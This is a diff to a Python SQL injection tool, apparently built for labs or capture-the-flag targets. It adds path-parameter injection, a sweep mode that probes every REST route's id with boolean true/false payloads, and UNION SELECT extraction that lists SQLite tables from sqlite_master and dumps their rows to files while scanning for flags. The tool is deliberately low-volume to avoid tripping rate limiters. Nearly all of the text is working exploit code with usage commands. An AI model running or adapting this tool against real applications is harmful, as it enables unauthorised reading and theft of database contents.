@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""sqlquick.py — low-volume SQLi fast-track for a single GET parameter, before sqlmap.
+"""sqlquick.py — low-volume SQLi fast-track for one parameter, before sqlmap.
 
 sqlmap is thorough and loud: dozens of requests per technique, easy to trip a lab's
 rate limiter before you even know there's a bug. This does the minimum needed to go
@@ -11,14 +11,37 @@ verify it, then a bounded, priority-ordered SQLite dump through that UNION.
     python3 sqlquick.py --url "https://target/api/search?q=widget" --token "$TOKEN"
     python3 sqlquick.py --url "https://target/api/items?id=1&sort=name" --param id
 
+**Path parameters are injectable too, and are the easiest position to miss.** A REST id
+sits in the path, not the query string, so there is no `--param` to name and a quote
+probe against it proves nothing: `/api/products/1'` returning "not found" is exactly
+what a *bound* integer does when the id fails to match. Target one with `--path-param`
+(injects the last path segment, using its current value as the seed) or by marking the
+position with `*`:
+
+    python3 sqlquick.py --url "https://target/api/products/1" --path-param
+    python3 sqlquick.py --url "https://target/api/products/*/reviews" --seed 1
+
+`--sweep` triages every path parameter at once straight off jsharvest's methods.txt —
+3-5 probes each, numeric differential first then a quoted-string form — and prints the
+ready-to-run command for anything that answers. Run it before authenticating; it is the
+cheapest way to find the one route that concatenates.
+
+    python3 sqlquick.py --sweep --base https://target --methods recon/methods.txt
+
 A quote producing a DB error is never reported as SQLi on its own — only a true/false
 behavioural differential confirms it. Every request is rate-limited (0.55s default
 delay) and 429s get two backoff retries (~3s, ~6s); if throttling persists past that,
 the run aborts as inconclusive rather than reporting a false negative.
 
 Options:
-  --url URL          target URL with the injectable parameter in its query string
+  --url URL           target URL; query param in its query string, or a `*` marker /
+                      --path-param to inject a path segment
   --param NAME        which query param to inject; inferred if the URL has exactly one
+  --path-param        inject the final path segment instead of a query parameter
+  --seed VALUE        override the seed value injected around (default: current value, else 1)
+  --sweep             triage mode: numeric differential over every path param
+  --base URL          --sweep only: target root
+  --methods FILE      --sweep only: jsharvest/jsmine methods.txt ('-' for stdin)
   --token / --cookie / --header "K: V" (repeatable)
   --out DIR           save every response here (default: sqlquick_out)
   --delay S           inter-request delay, default 0.55
@@ -34,7 +57,7 @@ import re
 import secrets
 import sys
 import time
-from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
+from urllib.parse import parse_qsl, quote, unquote, urlencode, urlsplit, urlunsplit
 
 import requests
 
@@ -63,6 +86,29 @@ FORMS = {
     "paren":       "{seed}) {sql}--",
 }
 
+# Marks the injection point inside a URL path, e.g. /api/products/*/reviews.
+PATH_MARKER = "*"
+
+# Suppresses the app's own rows before a UNION. A /resource/:id endpoint returns a
+# single row, so `1 UNION SELECT <payload>` hands back the *legitimate* product and the
+# payload row is never seen -- the extraction silently yields nothing on exactly the
+# endpoint shape path-parameter injection targets. Emptying the left-hand side first
+# makes the UNION row the only candidate, whatever the seed.
+EMPTY_PREFIX = {
+    "numeric":     "AND 1=2 ",
+    "numeric-cmt": "AND 1=2 ",
+    "string-sq":   "AND '1'='2' ",
+    "paren":       "AND 1=2 ",
+}
+
+# --sweep pairs: a true condition that must keep the baseline response, and a false
+# condition that must change it. Numeric first because a REST id is nearly always an
+# integer context, where a quote probe is meaningless.
+SWEEP_FORMS = (
+    ("numeric",   "{seed} AND 1=1",        "{seed} AND 1=2"),
+    ("string-sq", "{seed}' AND '1'='1",    "{seed}' AND '1'='2"),
+)
+
 
 class RateLimited(Exception):
     pass
@@ -85,6 +131,12 @@ class Prober:
 
     def url_for(self, value):
         parts = urlsplit(self.base_url)
+        if self.param is None:
+            # Path-parameter mode: substitute the marked segment. Percent-encode the
+            # payload so spaces and quotes survive as one segment instead of being
+            # read as a new path component or a query string.
+            path = parts.path.replace(PATH_MARKER, quote(str(value), safe=""), 1)
+            return urlunsplit((parts.scheme, parts.netloc, path, parts.query, parts.fragment))
         q = parse_qsl(parts.query, keep_blank_values=True)
         q = [(k, value if k == self.param else v) for k, v in q]
         return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))
@@ -183,8 +235,68 @@ def infer_param(url, given):
     q = parse_qsl(urlsplit(url).query, keep_blank_values=True)
     if len(q) == 1:
         return q[0][0]
+    if not q:
+        sys.exit("[!] URL has no query parameters — for a REST id in the path use "
+                 "--path-param, or mark the position with * (e.g. /api/products/*)")
     sys.exit("[!] URL has %d query params (%s) — pass --param to pick one"
               % (len(q), ", ".join(k for k, _ in q)))
+
+
+def resolve_target(url, given_param, path_param, given_seed):
+    """Work out what gets injected. Returns (param_or_None, seed, template_url).
+
+    param is None for path-parameter mode, where the template URL carries a PATH_MARKER
+    that url_for() substitutes.
+    """
+    parts = urlsplit(url)
+    if PATH_MARKER in parts.path or path_param:
+        path, seed = parts.path, given_seed or "1"
+        if PATH_MARKER not in path:
+            segs = path.rstrip("/").split("/")
+            if len(segs) < 2 or not segs[-1]:
+                sys.exit("[!] --path-param needs a final path segment to inject, "
+                         "e.g. /api/products/1")
+            if not given_seed:
+                seed = unquote(segs[-1])
+            segs[-1] = PATH_MARKER
+            path = "/".join(segs)
+        tmpl = urlunsplit((parts.scheme, parts.netloc, path, parts.query, parts.fragment))
+        return None, seed, tmpl
+    param = infer_param(url, given_param)
+    seed = given_seed or dict(parse_qsl(parts.query, keep_blank_values=True)).get(param, "1")
+    return param, seed, url
+
+
+def path_templates(path):
+    """Yield one template per {...} placeholder, that one marked and the rest set to 1.
+
+    /api/products/{...}/reviews yields the product-id position, which a sweep that only
+    handled a trailing placeholder would never test.
+    """
+    spans = [m.span() for m in re.finditer(r"\{[^}]*\}", path)]
+    for i in range(len(spans)):
+        out, last = [], 0
+        for j, (s, e) in enumerate(spans):
+            out.append(path[last:s])
+            out.append(PATH_MARKER if j == i else "1")
+            last = e
+        out.append(path[last:])
+        yield "".join(out), i
+
+
+def parse_methods(fh):
+    """Read 'METHOD /path' lines, tolerating jsmine's indented METHOD -> PATH section."""
+    seen, out = set(), []
+    for line in fh:
+        line = line.strip()
+        m = re.match(r"^(GET|POST|PUT|PATCH|DELETE|HEAD)\s+(/\S*)$", line)
+        if not m:
+            continue
+        key = (m.group(1), m.group(2))
+        if key not in seen:
+            seen.add(key)
+            out.append(key)
+    return out
 
 
 def compose(form, seed, sql):
@@ -206,12 +318,16 @@ def order_by_boundary(pr, form, seed, base_ev, max_cols):
     return last_ok
 
 
+def union_sql(form, cols):
+    return EMPTY_PREFIX.get(form, "") + "UNION SELECT " + ",".join(cols)
+
+
 def union_verify(pr, form, seed, col_count, start_tok, end_tok):
     marker = "%sOK%s" % (start_tok, end_tok)
     for pos in range(col_count):
         cols = ["NULL"] * col_count
         cols[pos] = "'%s'" % marker
-        ev = pr.send(pr.url_for(compose(form, seed, "UNION SELECT " + ",".join(cols))),
+        ev = pr.send(pr.url_for(compose(form, seed, union_sql(form, cols))),
                      "union-verify-col%d" % pos)
         if marker in ev["text"]:
             return pos
@@ -221,7 +337,7 @@ def union_verify(pr, form, seed, col_count, start_tok, end_tok):
 def sqlite_extract(pr, form, seed, col_count, payload_col, start_tok, end_tok, sql_expr):
     cols = ["NULL"] * col_count
     cols[payload_col] = "('%s' || COALESCE((%s),'') || '%s')" % (start_tok, sql_expr, end_tok)
-    ev = pr.send(pr.url_for(compose(form, seed, "UNION SELECT " + ",".join(cols))), "extract")
+    ev = pr.send(pr.url_for(compose(form, seed, union_sql(form, cols))), "extract")
     m = re.search(re.escape(start_tok) + r'(.*?)' + re.escape(end_tok), ev["text"], re.S)
     return m.group(1) if m else None
 
@@ -231,10 +347,106 @@ def is_priority(name):
     return any(k in low for k in PRIORITY_KEYWORDS)
 
 
+def sweep_one(pr, seed_candidates):
+    """Numeric-then-string boolean differential on one marked position.
+
+    Returns (verdict, form, seed) where verdict is "injectable", "clean", or
+    "no-baseline". A quote is never consulted: the whole point is that a bound integer
+    and a concatenated one look identical to a quote probe.
+
+    "no-baseline" matters as much as the other two. If every candidate id 404s -- an
+    orders/:id scoped to another user, say -- then nothing was ever tested, and
+    reporting that as clean is the "negative from behind a tripped guard" mistake.
+    """
+    for seed in seed_candidates:
+        base = pr.send(pr.url_for(seed), "sweep-base-%s" % seed)
+        if base["status"] >= 400 or base["size"] == 0:
+            continue                      # id doesn't exist; try the next one
+        for form, t_tpl, f_tpl in SWEEP_FORMS:
+            t = pr.send(pr.url_for(t_tpl.format(seed=seed)), "sweep-%s-true" % form)
+            if not resembles(t, base):
+                continue                  # true condition already broke it: not this form
+            f = pr.send(pr.url_for(f_tpl.format(seed=seed)), "sweep-%s-false" % form)
+            if differs(f, t):
+                return "injectable", form, seed
+        return "clean", None, seed        # baseline was usable; no need to try more seeds
+    return "no-baseline", None, None
+
+
+def run_sweep(a, headers):
+    """Triage every path parameter in methods.txt for a boolean differential."""
+    src = sys.stdin if a.methods == "-" else open(a.methods, encoding="utf-8", errors="replace")
+    try:
+        entries = parse_methods(src)
+    finally:
+        if src is not sys.stdin:
+            src.close()
+
+    base = a.base.rstrip("/")
+    targets = []
+    for method, path in entries:
+        if method != "GET" or "{" not in path:
+            continue
+        for tmpl, pos in path_templates(path):
+            targets.append((path, pos, base + tmpl))
+    if not targets:
+        print("[*] no GET route with a path parameter in %s — nothing to sweep" % a.methods)
+        print("    (routes with {...} placeholders are the only ones this mode tests)")
+        return 0
+
+    print("[*] sweeping %d path parameter position(s) for a boolean differential" % len(targets))
+    print("[*] numeric first (`1 AND 1=1` vs `1 AND 1=2`), then a quoted-string form\n")
+    seeds = [a.seed] if a.seed else ["1", "2", "3"]
+    hits, untested = [], []
+    for path, pos, tmpl in targets:
+        pr = Prober(requests.Session(), tmpl, None, headers, a.out, a.delay, a.retries)
+        label = "%s [param %d]" % (path, pos + 1)
+        try:
+            verdict, form, seed = sweep_one(pr, seeds)
+        except RateLimited as e:
+            print("  %-46s THROTTLED — inconclusive (%s)" % (label, e))
+            untested.append((label, "throttled"))
+            continue
+        if verdict == "injectable":
+            print("  %-46s *** INJECTABLE (%s, seed %s)" % (label, form, seed))
+            hits.append((tmpl, seed))
+        elif verdict == "no-baseline":
+            print("  %-46s UNTESTED — no id in %s returned a body"
+                  % (label, "/".join(seeds)))
+            untested.append((label, "no usable id"))
+        else:
+            print("  %-46s no differential (seed %s)" % (label, seed))
+
+    print("\n" + "=" * 78)
+    if untested:
+        print("%d position(s) UNTESTED, not cleared — rerun with --seed <an id you own>:"
+              % len(untested))
+        for label, why in untested:
+            print("    %-44s (%s)" % (label, why))
+    if not hits:
+        print("no path parameter showed a boolean differential")
+        print("NOTE: only GET path params were tested. Query params, POST bodies and")
+        print("      headers are NOT covered — a clean sweep does not clear those.")
+        return 0
+    print("%d injectable path parameter(s) — confirm and dump with:" % len(hits))
+    for tmpl, seed in hits:
+        print("  python3 %s --url '%s' --seed %s%s"
+              % (os.path.basename(__file__), tmpl, seed,
+                 ' --token "$TOKEN"' if a.token else ""))
+    return 0
+
+
 def main():
     ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
-    ap.add_argument("--url", required=True)
+    ap.add_argument("--url")
     ap.add_argument("--param")
+    ap.add_argument("--path-param", action="store_true",
+                    help="inject the final path segment instead of a query parameter")
+    ap.add_argument("--seed", help="value to inject around (default: current value, else 1)")
+    ap.add_argument("--sweep", action="store_true",
+                    help="triage every path parameter in --methods for a differential")
+    ap.add_argument("--base", help="--sweep only: target root")
+    ap.add_argument("--methods", help="--sweep only: methods.txt ('-' for stdin)")
     ap.add_argument("--token")
     ap.add_argument("--cookie")
     ap.add_argument("--header", action="append", default=[])
@@ -246,10 +458,13 @@ def main():
     ap.add_argument("--dump-all", action="store_true")
     a = ap.parse_args()
 
+    if a.sweep:
+        if not (a.base and a.methods):
+            ap.error("--sweep needs --base and --methods")
+    elif not a.url:
+        ap.error("--url is required (or use --sweep with --base/--methods)")
+
     os.makedirs(a.out, exist_ok=True)
-    param = infer_param(a.url, a.param)
-    seed = dict(parse_qsl(urlsplit(a.url).query, keep_blank_values=True)).get(param, "1")
-    print("[*] target param: %s   seed value: %r" % (param, seed))
 
     headers = {"User-Agent": UA, "Accept": "application/json, */*"}
     if a.token:
@@ -261,7 +476,16 @@ def main():
             k, v = h.split(":", 1)
             headers[k.strip()] = v.strip()
 
-    pr = Prober(requests.Session(), a.url, param, headers, a.out, a.delay, a.retries)
+    if a.sweep:
+        sys.exit(run_sweep(a, headers))
+
+    param, seed, target = resolve_target(a.url, a.param, a.path_param, a.seed)
+    if param is None:
+        print("[*] target: path parameter in %s   seed value: %r" % (target, seed))
+    else:
+        print("[*] target param: %s   seed value: %r" % (param, seed))
+
+    pr = Prober(requests.Session(), target, param, headers, a.out, a.delay, a.retries)
 
     try:
         base_ev = pr.send(pr.url_for(seed), "baseline")
@@ -312,11 +536,17 @@ def main():
         # Printable, random, all-alnum tokens — not raw control bytes: a JSON response
         # escapes char(31)/char(30)/char(29) to a literal ""-style 6-char sequence,
         # so a delimiter that has to survive a transport encoding needs to already be text.
-        start_tok = "Q" + secrets.token_hex(4).upper()
-        end_tok = "Q" + secrets.token_hex(4).upper()
-        list_sep = "L" + secrets.token_hex(3).upper()
-        col_sep = "C" + secrets.token_hex(3).upper()
-        row_sep = "R" + secrets.token_hex(3).upper()
+        # Each delimiter is bracketed by '~' so it never ends on an alphanumeric.
+        # FLAG_RE begins (?<![A-Za-z0-9]) to avoid matching mid-identifier in a JS
+        # bundle; with a bare hex delimiter a dumped flag reads as "...C4A2F1bug{...}"
+        # and that lookbehind suppresses it, so a flag sitting in a dumped column was
+        # written to dump_<table>.txt and never announced. '~' is unreserved in a URL
+        # path and safe inside a SQL string literal.
+        start_tok = "~Q" + secrets.token_hex(4).upper() + "~"
+        end_tok = "~Q" + secrets.token_hex(4).upper() + "~"
+        list_sep = "~L" + secrets.token_hex(3).upper() + "~"
+        col_sep = "~C" + secrets.token_hex(3).upper() + "~"
+        row_sep = "~R" + secrets.token_hex(3).upper() + "~"
         payload_col = union_verify(pr, winning_form, seed, col_count, start_tok, end_tok)
         if payload_col is None:
             print("RESULT: boolean differential + column count confirmed, but UNION SELECT "
@@ -327,8 +557,14 @@ def main():
 
         tables_blob = sqlite_extract(pr, winning_form, seed, col_count, payload_col,
                                       start_tok, end_tok,
+                                      # char(37) is '%'. A literal percent cannot be used
+                                      # here: URL-encoded as %25 inside a path segment it
+                                      # is rejected with a 400 by proxies/CDNs in front of
+                                      # the app, so the whole extraction silently returns
+                                      # nothing in --path-param mode.
                                       "SELECT group_concat(name, '%s') FROM sqlite_master "
-                                      "WHERE type='table' AND name NOT LIKE 'sqlite_%%'" % list_sep)
+                                      "WHERE type='table' AND name NOT LIKE 'sqlite_'||char(37)"
+                                      % list_sep)
         tables = [t for t in (tables_blob or "").split(list_sep) if t]
         print("[*] %d table(s): %s" % (len(tables), ", ".join(tables)))
 
@@ -365,7 +601,13 @@ def main():
                 for row in rows:
                     fh.write(",".join(row) + "\n")
             print("  [+] %s: %d column(s), %d row(s) -> %s" % (table, len(columns), len(rows), dump_path))
-            found = scan_flags_text(rows_blob or "")
+            # Scan the parsed cells, not the raw blob: a cell has clean boundaries, so
+            # a flag occupying a whole column value can't be masked by an adjacent
+            # delimiter however the separators are generated.
+            found = set()
+            for row in rows:
+                for cell in row:
+                    found |= scan_flags_text(cell)
             if found:
                 for f in found:
                     print("      FLAG: %s" % f)
